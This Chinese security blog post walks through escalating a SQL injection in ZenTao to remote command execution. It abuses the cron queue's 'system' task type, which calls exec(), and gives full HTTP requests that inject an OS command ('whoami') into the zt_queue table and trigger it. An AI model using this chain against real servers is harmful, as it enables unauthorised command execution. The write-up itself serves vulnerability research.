---
title: 浅析禅道利用第二弹之从SQLi到RCE
url: https://y4tacker.github.io/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/
source: Y4tacker:Hacking The World!
date: 2024-08-28
fetch_date: 2025-10-06T18:03:41.893825
---

# 浅析禅道利用第二弹之从SQLi到RCE

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

Previous post Next post Back to top Share post

1. [1. 正文](#%E6%AD%A3%E6%96%87)
   1. [1.1. 初入](#%E5%88%9D%E5%85%A5)
   2. [1.2. 窥探](#%E7%AA%A5%E6%8E%A2)
   3. [1.3. 终成](#%E7%BB%88%E6%88%90)

# 浅析禅道利用第二弹之从SQLi到RCE

Y4tacker

2024-08-27 (Updated: 2025-09-02)

[PHP](/categories/PHP/)

[PHP](/tags/PHP/), [禅道](/tags/%E7%A6%85%E9%81%93/)

## 正文

### 初入

书接上文，我们能任意执行SQL语句了，在代码中发现一个定时任务模块

为方便讲解我们先以admin身份登入后台，可以看到定时任务表面上只是执行对应模块下的方法，啥都不可控制

![image-20240827232040983](/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/image-20240827232040983.png)

甚至当我们手动添加定时任务时，也只有自调用，通过抓包得到type为zentao

![image-20240827232159734](/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/image-20240827232159734.png)

### 窥探

然而当我们仔细看代码实现时`module/cron/control.php`

这里我第一个看到了一个比较有趣的调用，手动触发定时任务

![image-20240827232441176](/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/image-20240827232441176.png)

可以看到在消费任务时，查询所有状态为`wait`的任务传入`consumeTask`执行，不难发现当`type == 'system'`，调用了exec！！！

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` public function consumeTasks(int $execId) {     while(true)     {         $this->cron->updateTime('consumer', $execId);          /* Consume. */         $task = $this->dao->select('*')->from(TABLE_QUEUE)->where('status')->eq('wait')->andWhere('command')->ne('')->orderBy('createdDate')->fetch();         if(!$task) break;          $this->consumeTask($execId, $task);     } } ``` |

我们继续看这个`consumeTask`，

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 ``` | ``` public function consumeTask(int $execId, object $task) {     /* Other executor may execute the task at the same time，so we mark execId and wait 500ms to check whether we own it. */     $this->dao->clearCache();     $this->dao->update(TABLE_QUEUE)->set('status')->eq('doing')->set('execId')->eq($execId)->where('id')->eq($task->id)->exec();     usleep(500);      $task = $this->dao->select('*')->from(TABLE_QUEUE)->where('id')->eq($task->id)->fetch();     if($task->execId != $execId) return;      /* Execution command. */     $output = '';     $return = '';      unset($_SESSION['company']);     unset($this->app->company);      /* Mark that this request was triggered by the scheduled task, not by the user. */     $_SESSION['fromCron'] = true;      $this->loadModel('common');     $this->common->setCompany();     $this->common->loadConfigFromDB();      try     {         if($task->type == 'zentao')         {             parse_str($task->command, $params);             if(isset($params['moduleName']) and isset($params['methodName']))             {                 $this->viewType = 'html';                  $this->app->loadLang($params['moduleName']);                 $this->app->loadConfig($params['moduleName']);                 $output = $this->fetch($params['moduleName'], $params['methodName']);             }         }         elseif($task->type == 'system')         {             exec($task->command, $out, $return);             if($out) $output = implode(PHP_EOL, $out);         }     }     catch(EndResponseException $endResponseException)     {         $output = $endResponseException->getContent();     }     catch(Exception $e)     {         $output = $e;     }      $this->dao->update(TABLE_QUEUE)->set('status')->eq('done')->where('id')->eq($task->id)->exec();     $this->dao->update(TABLE_CRON)->set('lastTime')->eq(date(DT_DATETIME1))->where('id')->eq($task->cron)->exec();      $log = date('G:i:s') . " execute\ncronId: {$task->cron}\nexecId: $execId\ntaskId: {$task->id}\ncommand: {$task->command}\nreturn : $return\noutput : $output\n\n";     $this->cron->logCron($log);      return true; } ``` |

然而在我激动的时候发现，计算器一直没弹出来，但看到上面log的操作把任务结果返回给我们了

### 终成

因此我们可以去执行一些命令手动去日志目录下验证是否成功执行

Step1(构造语句)：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` POST /zentao/my-preference HTTP/1.1 Host:  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Referer: http://xxxx/zentao/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 293  edition=y4hacker&vision=y4';INSERT INTO  zt_queue(TYPE,command,cron,createdDate,execId) VALUE('system','whoami',1,CURRENT_TIME(),123456);#/../../open/rnd ``` |

Step2(触发SQL);

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` GET /zentao/product-y4tacker HTTP/1.1 Host:  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Referer: http://xxxx/zentao/index.php Content-Type: application/x-www-form-urlencoded ``` |

Step3(手动触发定时任务)

登陆后台时程序逻辑会触发一次，可以看到这里登录的是低权限账号，左侧功能页面基本啥操作都没有

![image-20240827233137490](/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/image-20240827233137490.png)

当然想要更稳定，直接手动执行也行(存在任务返回空白页面，不存在要执行的任务则返回创建任务页面)

![image-20240827233435895](/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/image-20240827233435895.png)

接下来去日志文件点开日志查看(方便博客查看，我删除了其他杂七杂八的命令)，果然执行成功了！

![image-20240827233534287](/2024/08/27/year/2024/8/%E7%A6%85%E9%81%93%E5%88%A9%E7%94%A8%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E4%BB%8ESQLi%E5%88%B0RCE/image-20240827233534287.png)

Please enable JavaScript to view the comments.

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

1. [1. 正文](#%E6%AD%A3%E6%96%87)
   1. [1.1. 初入](#%E5%88%9D%E5%85%A5)
   2. [1.2. 窥探](#%E7%AA%A5%E6%8E%A2)
   3. [1.3. 终成](#%E7%BB%88%E6%88%90)

Menu TOC Share Top

Copyright © 2016-2025 Y4tacker

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

本站总访问量次 | 本站访客数人